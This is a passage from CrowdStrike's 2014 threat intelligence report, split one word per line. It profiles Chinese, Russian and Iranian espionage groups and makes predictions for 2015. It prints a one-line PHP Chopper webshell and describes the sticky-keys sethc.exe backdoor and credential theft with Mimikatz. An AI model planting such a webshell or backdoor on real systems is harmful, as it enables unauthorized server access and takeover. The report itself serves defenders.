adversary
to
better
protect
your
network
.

Detect
,
deter
,
and
defend
against
today
's
most
sophisticated
attackers
.

two
thousand
fourteen
CrowdStrike
Global
Threat
Intel
Report
Know
the
Adversary
Effect
of
Public
Reporting
on
Adversary
Activity
In
the
2013
Global
Threat
Report
,
CrowdStrike
discussed
a
Russian
adversary
designated
ENERGETIC
BEAR
.

Beginning
in
July
2014
,
several
security
vendors
disclosed
additional
information
on
this
actor
.

This
adversary
has
previously
demonstrated
more
than
a
basic
awareness
of
operational
security
(
OPSEC
)
.

Unsurprisingly
,
ENERGETIC
BEAR
quickly
abandoned
their
compromised
website
C2
infrastructure
they
had
acquired
for
these
operations
.

Although
infected
machines
would
continue
to
beacon
to
the
C2
servers
,
no
further
tasking
would
be
provided
.

Since
the
public
disclosures
,
no
new
builds
of
the
malware
used
by
ENERGETIC
BEAR
–
primarily
the
Havex
and
SYSMain
RATs
–
have
been
observed
.

This
toolset
has
seen
several
evolutionary
developments
over
a
period
spanning
at
least
five
years
,
and
its
loss
is
likely
to
cause
the
adversary
to
enter
a
retooling
phase
.

The
underlying
intelligence
requirements
driving
their
operations
are
unlikely
to
change
,
however
,
and
it
is
likely
that
ENERGETIC
BEAR
will
re
-
emerge
with
a
new
toolset
in
the
future
.

In
June
2014
,
CrowdStrike
published13
public
reporting
detailing
the
attribution
of
an
adversary
designated
as
PUTTER
PANDA
to
the
12th
Bureau
of
the
3rd
General
Staff
Department
of
the
People
's
Liberation
Army
,
also
known
as
Unit
61486
.

This
attribution
was
facilitated
by
one
of
the
PUTTER
PANDA
operators
providing
pictures
of
the
unit
's
operational
base
on
social
media
,
using
accounts
that
could
be
associated
with
C2
domains
–
a
serious
OPSEC
mistake
.

After
the
publication
of
CrowdStrike
's
report
,
the
social
media
account
containing
photos
of
the
unit
's
base
was
deleted
,
and
PUTTER
PANDA
appears
to
have
stopped
using
the
tools
previously
identified
by
CrowdStrike
.

Know
the
Adversary
Another
significant
public
disclosure
of
an
adversary
group
was
the
publication
of
a
report
on
Unit
61398
(
a.k.a
.

COMMENT
PANDA
)
in
February
2013
.

While
this
group
also
initially
"
went
dark
"
following
the
report
's
public
release
,
there
have
been
indications
that
this
actor
was
in
operation
again
by
October
2013
.

The
disclosure
of
information
regarding
ongoing
operations
has
been
hotly
contested
in
the
information
security
community
.

Many
attribute
such
disclosures
to
marketing
or
other
self
-
promoting
behavior
.

While
the
motivations
surrounding
public
disclosures
are
certainly
open
to
discussion
,
these
observations
indicate
that
public
disclosures
to
date
have
had
a
significant
impact
on
advanced
adversary
operations
.

It
is
becoming
apparent
that
the
priorities
levied
by
organizations
sponsoring
cyber
espionage
are
unaffected
by
such
disclosures
.

It
is
highly
likely
that
groups
who
have
been
publicly
reported
on
will
return
to
the
same
activities
with
new
toolsets
,
if
they
have
not
already
.

CrowdStrike
's
approach
to
public
disclosure
balances
the
benefits
of
disrupting
operations
with
the
risk
of
losing
visibility
into
adversary
actions
by
driving
a
change
in
TTPs
.

This
balance
is
accomplished
by
looking
at
the
existing
publicly
available
reporting
,
and
what
the
likely
reaction
by
the
adversary
is
.

This
is
then
reviewed
in
terms
of
Intelligence
Gain
/
Loss
(
IGL
)
;
among
other
things
,
this
includes
the
potential
intelligence
value
of
a
disclosure
,
what
are
potential
impacts
to
visibility
of
the
adversary
,
and
how
does
this
impact
the
ability
to
protect
customers
?
Forcing
the
adversary
to
retool
means
the
cost
of
doing
business
has
gone
up
;
they
must
invest
in
new
tools
,
infrastructure
,
and
potentially
training
,
which
may
have
consequences
for
how
brazen
the
adversary
will
be
in
the
future
.

HURRICANE
PANDA
HURRICANE
PANDA
is
an
advanced
China
-
based
adversary
actively
targeting
Internet
services
,
engineering
,
and
aerospace
companies
.

Know
the
Adversary
Since
February
2014
,
CrowdStrike
Intelligence
has
observed
HURRICANE
PANDA
leverage
at
least
two
zero
-
day
exploits
,
a
unique
DNS
resolution
technique
,
and
tools
traditionally
used
by
Chinese
actors
.

Once
inside
a
victim
's
network
,
this
adversary
seeks
to
gain
legitimate
credentials
to
move
laterally
and
establish
RDP
sessions
to
achieve
their
objectives
.

Based
on
their
technical
capabilities
,
HURRICANE
PANDA
is
currently
one
of
the
most
advanced
Chinese
actors
tracked
by
CrowdStrike
.

Zero
-
days
,
Exploits
,
and
Web
Vulnerabilities
As
stated
above
,
CrowdStrike
Intelligence
observed
HURRICANE
PANDA
leveraging
two
zero
-
day
exploits
,
indicating
that
this
adversary
has
above
-
average
capability
or
access
to
exploit
developers
.

First
,
in
February
2014
this
actor
was
observed
using
SWC
tactics
to
gain
initial
footholds
into
victim
networks
via
CVE-
2014
-
0322
.

Successful
exploitation
during
this
campaign
led
victims
to
install
the
Sakula
malware
.

Much
of
the
targeting
in
this
campaign
appeared
to
be
against
the
French
aerospace
sector.14
In
October
2014
,
HURRICANE
PANDA
used
CVE-2014
-
4113
to
escalate
privileges
on
already
-
compromised
64-bit
Windows
machines.15
Their
exploitation
of
this
vulnerability
marked
the
first
time
it
was
observed
in
the
wild
.

In
addition
to
zero
-
day
exploits
,
HURRICANE
PANDA
has
also
used
three
other
privilege
-
escalation
exploits
and
another
remote
code
execution
exploit
.

Finally
,
in
another
case
,
HURRICANE
PANDA
gained
initial
access
to
a
victim
via
a
SQL
injection
vulnerability
.

They
then
used
the
vulnerability
to
upload
a
simple
Chopper
webshell
script
to
gain
additional
access
,
move
laterally
to
the
corporate
network
,
and
install
additional
RATs
.

The
RAT
Pack
HURRICANE
PANDA
makes
use
of
several
Remote
Access
Tools
Know
the
Adversary
(
RATs
)
.

Over
the
course
of
the
year
,
CrowdStrike
Intelligence
observed
this
adversary
employing
Sakula
,
Gh0st
RAT
,
PlugX
,
and
HiKit
.

While
Gh0st
RAT
has
been
widely
available
for
many
years
,
the
other
RATs
have
exclusively
been
tied
to
China
-
based
actors
.

This
actor
also
made
extensive
use
of
Chopper
webshell
;
this
provides
the
equivalent
functionality
of
a
RAT
for
adversary
control
of
webservers
.

Chopper
can
exist
in
a
rather
simple
form
.

<
?
php
eval($_POST["chopper
"
]
)
;
?
>
where
"
chopper
"
is
an
attacker
-
selected
password
of
sorts
.

This
simple
one
-
line
script
gives
an
attacker
access
to
a
webserver
from
which
they
can
deploy
privilege
-
escalation
tools
,
move
laterally
,
or
deploy
more
complex
scripts
to
interact
with
databases
on
the
webserver
.

While
PlugX
usage
has
increased
significantly
over
the
past
year
among
China
-
based
actors
,
HURRICANE
PANDA
's
usage
of
the
tool
was
notable
for
two
reasons
.

First
,
when
configuring
PlugX
,
the
attacker
is
given
the
option
of
using
up
to
four
DNS
servers
of
their
choosing
.

Knowing
this
,
HURRICANE
PANDA
discovered
a
unique
service
offered
by
California
-
based
Internet
service
provider
Hurricane
Electric
.

By
abusing
Hurricane
Electric
's
free
DNS
service
,
the
actors
were
able
to
resolve
popular
domains
like
www.pinterest.com
,
adobe.com
,
and
github.com
.

Using
legitimate
domains
presumably
would
fool
incident
responders
into
believing
the
communications
were
benign
.

HURRICANE
PANDA
leveraged
PlugX
's
custom
DNS
feature
to
use
the
free
DNS
hosting
services
provided
by
Hurricane
Electric
to
resolve
these
domains
to
PlugX
C2
nodes
instead
of
their
legitimate
IP
addresses
.

Hurricane
Electric
quickly
took
action
to
prevent
the
abuse
that
allowed
DNS
resolution
for
legitimate
domains
.

Know
the
Adversary
the
string
.

The
decoded
string
contains
the
protocol
over
which
to
communicate
,
as
well
as
the
IP
address
and
port
pair
.

When
the
above
strings
are
decoded
,
the
following
IP
addresses
are
used
as
PlugX
C2
servers
.

Post
-
Exploitation
and
Exfiltration
After
HURRICANE
PANDA
has
established
a
foothold
on
a
victim
's
network
,
they
then
seek
legitimate
credentials
via
tools
such
as
Windows
Credential
Viewer
,
Windows
Credential
Editor
,
or
Mimikatz
.

Once
credentials
have
been
obtained
,
the
actor
tends
to
use
these
for
access
to
the
network
instead
of
interacting
with
their
RAT
,
thus
reducing
their
footprint
and
allowing
them
to
appear
as
legitimate
VPN
users
.

If
credentials
can
not
be
obtained
,
HURRICANE
PANDA
will
often
rely
on
RDP
.

First
,
they
will
replace
the
sticky
keys
file
(
using
the
sethc.exe
hack16
)
with
a
copy
of
their
preferred
Chinese
version
of
cmd.exe
on
the
victim
machine
.

Then
they
will
access
the
victim
computer
over
RDP
,
and
,
when
presented
with
a
login
screen
,
IT
will
invoke
the
sticky
keys
mechanism
and
be
presented
with
an
administrative
command
shell
.

Furthermore
,
PlugX
contains
a
reverse
-
RDP
tunneling
capability
that
HURRICANE
PANDA
has
employed
.

Exfiltration
by
HURRICANE
PANDA
follows
a
simple
pattern
often
performed
by
China
-
based
adversaries
.

First
,
files
of
interest
are
compressed
and
password
protected
using
RAR
.

Next
,
they
stage
the
files
at
a
convenient
location
.

Finally
,
they
exfiltrate
the
files
from
the
network
via
FTP
.

Know
the
Adversary
Possible
Connections
to
AURORA
PANDA
CrowdStrike
Intelligence
is
currently
evaluating
possible
connections
between
HURRICANE
PANDA
and
AURORA
PANDA
.

There
is
currently
no
definitive
link
,
but
indicators
of
compromise
linked
to
AURORA
PANDA
have
been
discovered
on
networks
also
compromised
by
HURRICANE
PANDA
.

Other
connections
include
:
similar
toolsets
,
access
to
zero
-
day
exploits
,
and
possible
infrastructure
connections
.

HURRICANE
PANDA
is
among
the
more
capable
China
-
based
adversaries
,
and
run
-
ins
with
this
actor
should
be
treated
with
the
utmost
concern
.

GOTHIC
PANDA
GOTHIC
PANDA
is
another
advanced
Chinese
adversary
that
CrowdStrike
Intelligence
tracked
throughout
2014
.

This
adversary
has
been
observed
targeting
a
number
of
high
-
profile
victims
in
key
sectors
including
financial
,
technology
,
NGO
/
international
,
and
energy
.

In
early
May
2014
,
CrowdStrike
observed
this
adversary
mounting
a
campaign
in
which
spear
phishing
messages
were
used
to
direct
targets
to
landing
pages
that
would
exploit
a
zero
-
day
Use
-
After-
Free
vulnerability
in
Internet
Explorer
.

The
following
is
a
brief
timeline
of
important
events
in
this
campaign
.

Know
the
Adversary
In
addition
to
targeting
of
individuals
within
targeted
organizations
,
phishing
messages
from
this
adversary
were
observed
being
sent
to
mailing
lists
for
specialized
topics
such
as
high
-
performance
computing
,
weather
metadata
software
,
and
pre
-
medical
programs
at
educational
institutions
.

An
observed
phishing
message
is
show
below
.

Victims
in
these
campaigns
were
infected
with
the
implant
known
by
the
anti
-
virus
name
Pirpi
,
which
has
been
seen
in
use
since
2009
.

Pirpi
provides
the
adversary
with
a
traditional
set
of
RAT
features
that
allow
the
adversary
to
exfiltrate
and
deploy
files
,
along
with
remote
shell
access
to
a
compromised
system
.

GOTHIC
PANDA
is
considered
by
CrowdStrike
Intelligence
to
be
one
of
the
more
advanced
adversaries
tracked
.

Over
time
,
the
Pirpi
implant
has
improved
to
feature
more
aggressive
anti
-
analysis
techniques
,
and
the
network
communication
with
control
servers
has
improved
to
hinder
network
-
based
detection
.

While
investigating
GOTHIC
PANDA
,
CrowdStrike
Intelligence
identified
a
strong
code
overlap
between
the
Pirpi
implant
and
Know
the
Adversary
a
defunct
malware
known
by
the
anti
-
virus
name
Dreammon
(
or
DreamClick
)
.

This
malware
possesses
a
feature
set
more
in
line
with
adclicker
malware
rather
than
targeted
activity
.

As
adclicker
malware
is
more
common
with
criminal
adversaries
,
it
has
been
postulated
that
if
the
same
adversary
behind
Dreammon
is
behind
Pirpi
,
this
adversary
's
initial
motives
may
have
been
financially
driven
.

Overview
of
Russian
Threat
Actors
Although
the
Chinese
calendar
predicted
that
2014
would
be
the
Year
of
the
Horse
,
in
many
respects
2014
has
been
the
Year
of
the
Bear
in
the
cyber
realm
,
with
several
high
-
profile
Russia
-
based
actors
receiving
public
attention
.

The
reported
activity
has
included
actors
tracked
by
CrowdStrike
as
ENERGETIC
BEAR
,
FANCY
BEAR
,
and
VENOMOUS
BEAR
,
as
well
as
other
sets
such
as
Sandworm
,
which
uses
the
Black
Energy
toolset
in
targeted
attacks
,
in
contrast
to
its
normal
use
as
criminal
malware
.

CrowdStrike
also
tracks
other
adversaries
attributed
to
Russia
under
cryptonyms
such
as
BERSERK
BEAR
,
BOULDER
BEAR
,
and
the
financial
-
crime-
motivated
actor
MAGNETIC
SPIDER
.

VENOMOUS
BEAR
,
also
known
as
Snake
,
Turla
,
and
Oroborous
,
uses
a
set
of
implants
that
culminates
in
a
sophisticated
Windows
-
based
rootkit
that
can
leverage
an
encrypted
Virtual
File
System
(
VFS
)
as
a
staging
area
for
tools
to
deploy
and
data
prepared
for
exfiltration
.

It
also
includes
implants
for
other
platforms
such
as
Linux
that
can
be
used
to
operate
command
-
and
-
control
infrastructure
.

External
reporting
indicates
a
targeting
bias
toward
entities
in
the
government
sector
,
along
with
the
use
of
zero
-
day
exploits
.

These
TTPs
,
along
with
the
maturity
of
the
attacker
's
toolset
,
indicate
that
this
is
a
highly
sophisticated
adversary
.

FANCY
BEAR
is
CrowdStrike
's
name
for
an
adversary
also
known
as
Sofacy
.

Although
the
tools
used
by
this
actor
are
not
as
complex
as
those
employed
by
VENOMOUS
BEAR
,
they
share
a
common
targeting
focus
on
government
and
military
entities
,
with
a
particular
Know
the
Adversary
emphasis
on
Russia
's
"
near
abroad
"
regions
such
as
Eastern
Europe
.

As
well
as
implants
for
Windows
,
Linux
,
and
mobile
operating
systems
,
FANCY
BEAR
employs
credential
phishing
attacks
,
spoofing
legitimate
sites
to
harvest
the
details
of
users
of
interest
.

Proactive
analysis
during
2014
revealed
another
Russian
actor
that
has
not
encountered
public
exposure
,
yet
appears
to
have
been
tasked
by
Russian
state
interests
.

BERSERK
BEAR
has
conducted
operations
from
2004
through
to
the
present
day
,
primarily
aimed
at
collecting
intelligence
but
has
also
provided
capability
in
support
of
offensive
operations
in
parallel
to
the
Russia
/
Georgia
conflict
in
August
2008
.

ENERGETIC
BEAR
has
been
tracked
by
CrowdStrike
since
2012
.

The
adversary
initially
focused
on
targets
in
the
energy
sector
,
but
more
recently
had
branched
out
to
attempt
to
compromise
financial
,
industrial
,
and
commercial
organizations
.

This
corresponded
with
a
shift
from
primarily
using
SWC
attack
vectors
to
targeted
email
attacks
.

Analysis
of
ENERGETIC
BEAR
's
post
-
exploitation
activity
revealed
the
use
of
custom
tools
for
credential
harvesting
,
network
enumeration
,
and
interaction
with
industrial
automation
equipment
.

FANCY
BEAR
In
the
second
half
of
2014
,
CrowdStrike
Intelligence
analyzed
the
targeted
attack
activity
of
a
particularly
interesting
Russian
actor
named
FANCY
BEAR
.

The
campaigns
conducted
by
this
actor
target
high
-
profile
military
and
government
entities
in
a
variety
of
countries
,
most
notably
political
institutions
of
former
Soviet
nations
as
well
as
Eastern
European
countries
,
NATO
institutions
,
and
organizations
of
western
countries
.

Technical
indicators
,
such
as
the
resource
locales
and
C2
domain
registrant
information
,
exhibit
references
to
a
Russian
-
speaking
adversary
.

In
addition
,
the
targeting
is
consistent
with
strategic
interests
of
the
Russian
Federation
.

Know
the
Adversary
Targeting
of
high
-
profile
entities
requires
mature
and
versatile
technical
means
.

FANCY
BEAR
exhibits
a
consistent
level
of
technical
sophistication
with
respect
to
its
tools
,
and
the
actor
is
characterized
by
a
thorough
preparation
of
attacks
and
required
infrastructure
.

Their
main
implant
,
called
X
-
Agent
,
is
a
sophisticated
RAT
that
exhibits
a
modular
architecture
and
a
multi
-
year
development
history
.

As
a
consequence
,
the
adversary
can
combine
the
necessary
implant
functionality
on
a
per
-
target
basis
,
spanning
multiple
operating
systems
and
mobile
platforms
.

A
remarkable
feature
only
seen
with
some
of
the
well
-
engineered
and
mature
targeted
attack
malware
is
the
following
:
If
required
,
the
implant
can
switch
the
carrier
protocol
for
its
command
-
and-
control
channel
ranging
from
HTTP
over
email
to
removable
media
.

The
latter
is
specifically
suited
for
target
environments
that
do
not
have
direct
network
connectivity
to
a
C2
node
and
instead
rely
on
periodic
use
of
USB
removable
media
to
bridge
air
gaps
.

In
addition
,
recent
incidents
involved
heavily
obfuscated
malware
including
code
flow
obfuscation
,
likely
another
step
taken
in
order
to
hinder
analysis
efforts
.

All
of
these
underline
a
clear
targeted
attack
mission
.

<
Understand
how
the
evolving
capabilities
of
these
advanced
adversaries
will
affect
you
in
2015
.

Looking
Forward
Predicting
what
will
happen
in
2015
is
a
challenge
,
as
unforeseen
events
will
inevitably
occur
and
new
TTPs
from
adversaries
across
the
motivational
spectrum
will
continue
to
shape
the
threat
environment
.

Before
exploring
what
may
be
coming
in
2015
,
a
brief
look
back
at
the
predictions
for
2014
is
in
order
.

Last
year
,
CrowdStrike
made
a
number
of
predictions
about
the
2014
threat
landscape
,
many
of
which
came
to
fruition
.

Outlook
for
China
-
Based
Adversaries
China
is
,
by
now
,
well
known
for
conducting
cyber
espionage
campaigns
focused
on
accessing
intelligence
about
intellectual
property
,
mergers
and
acquisitions
,
and
technologies
highlighted
in
its
Five
-
Year
plans
.

Targeting
these
technologies
and
strategic
business
information
allow
its
domestic
companies
to
rapidly
make
"
leap
frog
"
developments
,
and
to
benefit
from
favorable
bargaining
positions
,
thus
elevating
them
to
become
global
leaders
.

This
behavior
is
expected
to
continue
in
2015
,
as
will
continued
targeting
of
foreign
government
entities
in
an
attempt
to
access
information
related
to
the
global
strategy
and
plans
of
these
countries
.

China
is
expected
to
continue
to
leverage
this
espionage
as
a
means
to
conduct
intelligence
collection
to
support
its
aspirations
to
further
push
the
envelope
on
its
territorial
claims
.

This
is
particularly
true
in
the
South
China
Sea
(
SCS
)
conflicts
with
Vietnam
and
the
Philippines
,
and
the
Senkaku
/
Diaoyu
island
dispute
with
Japan
.

China
has
already
undertaken
substantial
construction
of
manmade
islands
in
the
SCS
to
begin
projecting
its
power
,
and
as
its
Navy
continues
to
grow
,
it
will
only
seek
to
push
further
beyond
its
current
boundaries
.

China
is
aggressively
moving
forward
with
the
design
and
implementation
of
its
own
aircraft
carriers
,
which
will
no
doubt
have
an
impact
in
this
regional
issue
,
allowing
the
PRC
to
project
force
and
intimidate
its
neighbors
.

Looking
Forward
Taiwan
will
continue
to
play
a
very
important
role
in
the
potential
conflicts
to
come
,
not
only
as
a
testing
ground
for
malware
,
but
as
the
main
focus
for
expanding
Chinese
territorial
claims
.

The
PRC
views
Taiwan
as
an
inalienable
part
of
China
that
will
eventually
be
reunited
for
the
greater
good
of
both
peoples
and
therefore
places
it
above
other
territorial
conflicts
.

Taiwan
's
recent
shift
towards
a
decidedly
less
-
Beijing
-
friendly
,
DPP
-
led
government
is
of
great
concern
to
China
and
will
be
a
major
factor
in
how
China
uses
technology
to
facilitate
its
political
maneuverings
.

Taiwan
has
historically
been
penetrated
by
PRC
intelligence
services
at
all
levels
,
which
makes
cyber
one
of
the
first
visible
indicators
of
PRC
intentions
regarding
Taiwan
.

China
has
also
made
significant
headway
on
projecting
its
"
soft
power
"
abroad
via
multiple
billion
-
dollar
investments
,
particularly
in
the
sectors
of
communications
and
transportation
infrastructure
.

For
years
,
China
has
been
making
inroads
in
Africa
to
provide
the
vast
majority
of
the
continent
's
telecommunication
systems
,
but
only
recently
have
some
of
the
more
sinister
intentions
been
brought
to
light
.

In
December
2014
,
approximately
77
Chinese
nationals
were
found
to
be
running
a
sophisticated
command
center
out
of
a
house
in
Nairobi
,
Kenya
,
which
appeared
to
be
capable
of
targeting
the
main
communication
systems
in
the
capital
.

A
building
with
multiple
large
satellites
that
appears
to
be
annexed
to
the
Chinese
embassy
in
Paris
was
also
recently
reported
on
and
believed
to
be
connected
to
the
3PLA
's
8th
Bureau
,
Unit
61046
,
which
is
responsible
for
SIGINT
collection
on
western
Europe
.

Image
of
Alleged
SIGINT
Dishes
at
Chinese
Embassy
Annex
Looking
Forward
There
has
also
been
a
significant
amount
of
investment
poured
into
transportation
projects
,
particularly
high
-
speed
rail
(
HSR
)
lines
,
in
multiple
countries
.

China
has
already
planned
to
merge
its
two
top
train
makers
into
a
HSR
juggernaut
capable
of
building
massive
rail
lines
around
the
world
.

To
this
end
,
China
has
submitted
bids
for
massive
rail
projects
in
Nigeria
,
and
nearly
won
(
this
was
subsequently
canceled
)
another
project
in
Mexico
.

China
has
also
suggested
massive
lines
between
Beijing
and
Moscow
and
constructing
a
line
between
Delhi
and
Chennai
in
India
.

Beijing
also
remains
interested
in
proposals
for
HSRs
in
Britain
and
California
,
and
has
already
made
headway
on
construction
of
a
Hungary-
Serbian
HSR
that
will
connect
Belgrade
to
Budapest
.

In
total
,
the
projects
proposed
by
China
would
give
it
control
of
more
than
40,000
km
,
giving
it
significant
control
over
the
world
's
transportation
routes
.

It
seems
fairly
likely
that
,
given
China
's
previous
use
of
espionage
against
foreign
companies
(
which
it
has
used
to
gain
advantages
in
competitive
bidding
and
mergers
&
acquisitions
)
,
there
is
a
substantial
motivation
for
China
to
follow
suit
in
the
coming
year
as
it
looks
to
secure
its
position
as
the
global
leader
in
HSR
construction
.

Joint
Plan
of
Action
Could
Possibly
Drive
Iranian
Cyber
Attacks
The
Iranian
Joint
Plan
of
Action
(
JPOA
)
,
its
delay
,
and
its
ultimate
desired
path
by
politicians
to
negotiate
a
Comprehensive
Plan
of
Action
(
CPOA
)
are
preeminent
issues
in
the
global
press
and
political
circles
.

The
JPOA
is
a
temporary
agreement
made
between
Iran
and
an
intergovernmental
negotiating
body
consisting
of
China
,
France
,
the
Russian
Federation
,
the
Un
ited
Kingdom
,
the
United
States
and
Germany
.

The
agreement
was
originally
intended
to
be
a
six
-
month
period
in
which
the
Iranian
government
would
reduce
its
stockpile
of
enriched
uranium
fuel
and
suspend
specific
aspects
of
its
nuclear
energy
programs
in
exchange
for
the
UN
Security
Council
relaxing
of
specific
sanctions
previously
imposed
against
Iran
.

During
this
time
of
suspended
nuclear
research
activities
and
Looking
Forward
eased
sanctions
,
negotiating
parties
would
discuss
the
details
of
a
more
permanent
agreement
,
known
as
the
Comprehensive
Plan
of
Action
(
CPOA
)
.

The
JPOA
could
be
a
driver
or
tipping
point
for
future
cyber
attacks
by
Iran
against
western
targets
.

Iran
has
publicly
noted
the
understanding
that
negotiations
can
be
influenced
and
has
demonstrated
historically
that
it
is
willing
(
and
has
capabilities
)
to
conduct
cyber
operations
to
influence
negotiations
if
it
sees
fit
to
do
so
.

It
has
been
publicly
speculated
that
Iran
has
conducted
retaliatory
attacks
,
notably
the
Shamoon
incident
in
2012
.

Recent
open
-
source
activities
in
the
Iranian
underground
suggest
Iran
may
be
attempting
to
structure
or
resource
for
possible
future
cyber
operations
.

There
have
been
visibility
changes
with
regard
to
information
surrounding
Iranian
hackers
,
as
well
as
forums
and
websites
.

Popular
forums
for
Iranian
hackers
ISCN
and
Shabgard
have
been
shut
down
and
are
no
longer
publicly
accessible
.

Despite
the
shutdowns
,
there
will
likely
be
little
change
to
the
communication
occurring
between
affiliated
hackers
in
closed
communications
pathways
.

The
closing
of
these
forums
could
be
in
anticipation
of
future
malicious
activity
and
a
desire
to
decrease
the
public
profile
of
individuals
in
the
Iranian
underground
.

There
are
also
clear
links
between
the
Iranian
government
hacking
contests
intended
to
identify
hackers
with
advanced
skills
and
to
learn
advanced
methods
of
network
intrusion
.

For
example
,
in
November
2013
,
just
before
the
JPOA
agreement
was
signed
,
Sharif
University
of
Technology
conducted
a
contest
for
"
innovative
methods
"
of
computer
network
intrusions
and
defense
against
such
intrusions
.

Based
on
the
contest
announcements
,
Iranian
government
cyber
security
authorities
had
access
to
the
students
'
submissions
in
the
contest
,
and
those
submissions
were
not
released
to
the
public
but
rather
kept
private
to
only
those
with
access
to
the
contest
submissions
.

Looking
Forward
Iranian
adversaries
such
as
ROCKET
KITTEN
,
FLYING
KITTEN
,
and
CHARMING
KITTEN
were
quite
active
during
2014
targeting
western
governments
and
companies
.

The
motivation
to
attack
such
targets
will
only
increase
during
2015
.

However
,
should
the
process
around
the
JPOA
and
CPOA
take
a
turn
that
Iran
perceives
as
disadvantageous
,
the
motivation
will
likely
greatly
increase
.

Recent
revelations
indicate
that
ROCKET
KITTEN
may
have
,
in
fact
,
targeted
the
JPOA
negotiations
using
spear
phishing
that
may
have
targeted
diplomats
involved
in
the
meetings
.

Cyber
Spillover
from
Regional
Conflicts
Last
year
's
report
included
cyber
spillover
as
something
to
look
for
in
2014
,
and
it
will
be
equally
as
important
in
2015
.

Increasingly
,
real-
world
physical
conflicts
are
carrying
with
them
associated
cyber
components
.

Sometimes
the
related
cyber
operations
are
carried
out
by
entities
directly
engaged
in
the
conflict
,
and
other
times
entities
not
directly
involved
will
engage
in
cyber
operations
in
an
attempt
to
support
one
side
or
the
other
.

It
is
not
possible
to
predict
all
possible
conflicts
in
2015
,
but
there
are
three
primary
areas
to
keep
an
eye
on
.

The
conflict
that
may
see
the
most
significant
uptick
in
associated
activity
is
the
one
centered
around
ISIS
.

The
Syrian
civil
war
saw
quite
a
bit
of
associated
cyber
operations
against
western
targets
in
2013
,
many
of
which
were
attributed
to
the
DEADEYE
JACKAL
adversary
(
Syrian
Electronic
Army
)
.

Since
that
time
,
the
ISIS
terrorist
group
has
become
a
significant
threat
in
the
region
and
appears
to
be
capable
of
bringing
resources
to
bear
to
carry
out
malicious
cyber
attacks
.

Already
,
in
early
January
2015
,
a
group
calling
itself
CyberCaliphate
and
declaring
support
for
ISIS
hacked
the
social
media
presence
of
U.S.

Central
Command
and
used
it
to
spread
Islamist
propaganda
.

It
is
likely
that
this
and
other
related
groups
supporting
the
Islamist
cause
will
engage
in
operations
that
support
ISIS
objectives
.

Most
of
this
activity
is
likely
to
be
a
nuisance
,
such
as
defacements
and
Looking
Forward
low
-
level
DDOS
attacks
,
but
it
is
possible
that
more
advanced
actors
could
carry
out
targeted
or
even
destructive
attacks
.

The
South
China
Sea
will
be
an
area
to
continue
to
watch
in
2015
.

As
discussed
above
,
tensions
in
this
area
drove
a
great
deal
of
targeted
intrusion
activity
from
China
-
based
adversaries
in
2014
.

Tensions
subsided
toward
the
end
of
2014
,
but
the
region
is
rich
in
natural
resources
and
countries
there
,
particularly
China
,
are
eager
to
lay
claim
to
those
resources
.

Because
of
this
,
there
is
a
significant
possibility
that
the
conflict
will
flare
up
again
in
the
coming
year
.

One
thing
that
could
temper
the
possibility
for
conflict
is
if
oil
prices
remain
low
,
making
oil
exploration
in
the
area
potentially
less
lucrative
.

Ukraine
is
the
third
region
to
keep
an
eye
on
for
possible
cyber
spillover
in
2015
.

The
physical
conflict
there
already
spilled
over
into
cyberspace
,
as
was
discussed
above
.

So
long
as
the
Ukrainian
conflict
remains
unresolved
and
foreign
governments
continue
to
exert
pressure
on
Russia
via
economic
sanctions
,
expect
continued
Russian
targeting
of
governments
,
particularly
those
in
Europe
and
the
U.S.

Another
related
contributing
factor
to
Russian
cyber
operations
is
the
falling
price
of
oil
.

Russia
's
economy
is
deeply
dependent
on
oil
prices
.

The
precipitous
fall
in
the
price
of
oil
at
the
end
of
2014
and
going
into
2015
has
already
caused
a
great
deal
of
economic
turmoil
in
Russia
.

An
extended
period
of
low
oil
prices
could
result
in
increased
malicious
cyber
activity
from
Russian
adversaries
against
foreign
governments
and
private
sector
organizations
.

The
Future
for
PoS
Attacks
PoS
malware
experienced
a
great
deal
of
success
during
2014
,
however
upcoming
changes
may
force
changes
in
payment-
processing
systems
in
the
U.S.

For
example
,
several
major
credit
card
companies
are
expected
to
institute
new
policies
in
October
2015
that
will
shift
liability
for
fraudulent
transactions
to
whomever
Looking
Forward
is
using
the
weakest
payment
-
processing
systems
.

The
purpose
of
this
is
to
drive
retailers
to
adopt
EMV
(
Europay
,
MasterCard
,
and
Visa
)
standards
,
which
entail
chip
and
PIN
cards
that
use
a
combination
of
the
traditional
PIN
number
and
an
embedded
microchip
that
encrypts
vital
information
.

This
type
of
card
offers
a
more
secure
payment
card
solution
for
consumers
.

Additionally
,
several
alternative
solutions
,
such
as
Apple
Pay
and
Google
Wallet
,
have
started
becoming
adopted
,
allowing
for
payment
via
token
systems
.

In
theses
systems
,
rather
than
a
card
number
being
transmitted
,
a
one
-
time
token
is
passed
from
a
consumer
's
device
to
the
retailer
.

The
advantage
to
this
system
is
that
in
the
event
of
the
token
being
obtained
by
an
unauthorized
party
,
it
can
not
be
reused
for
later
transactions
.

Adoption
of
these
newer
payment
processes
should
provide
consumers
with
more
secure
payment
methods
and
make
it
more
difficult
for
criminals
seeking
to
make
money
off
these
systems
.

There
will
be
some
lag
time
in
2015
as
retailers
and
banks
move
to
put
these
improvements
in
place
,
during
which
cybercriminals
will
still
be
able
to
exploit
the
current
,
antiquated
payment
processing
systems
in
the
U.S.

However
,
the
newer
processes
,
once
in
place
,
should
lead
to
a
decline
in
the
type
of
PoS
attacks
seen
over
the
past
year
.

Despite
this
decline
,
it
is
almost
certain
that
the
implementation
of
more
secure
methods
will
lead
cybercriminals
to
develop
more
sophisticated
means
by
which
to
attack
payment-
processing
systems
.

Destructive
and
Disruptive
Attacks
Destructive
attacks
(
such
as
those
carried
out
by
SILENT
CHOLLIMA
)
and
disruptive
attacks
(
such
as
the
DDOS
activity
against
gaming
platforms
)
garnered
headlines
at
the
end
of
2014
.

The
high
-
profile
nature
of
these
attacks
does
not
necessarily
indicate
that
they
will
grow
in
popularity
in
2015
,
however
it
is
Looking
Forward
possible
that
the
success
of
these
attacks
may
encourage
other
groups
to
engage
in
destructive
or
disruptive
operations
to
advance
their
interests
.

As
an
example
of
this
,
a
series
of
disruptive
attacks
in
December
targeted
online
gaming
platforms
.

These
attacks
manifested
in
the
form
of
DDOS
operations
carried
out
by
the
LizardSquad
group
briefly
discussed
above
.

The
attacks
came
in
two
waves
,
the
first
of
which
was
in
early
December
when
the
Xbox
Live
and
PlayStation
networks
were
knocked
offline
for
a
short
period
of
time
.

The
second
wave
of
attacks
occurred
on
25
December
2014
when
the
Xbox
and
PlayStation
online
platforms
suffered
more
outages
that
LizardSquad
claimed
responsibility
for
.

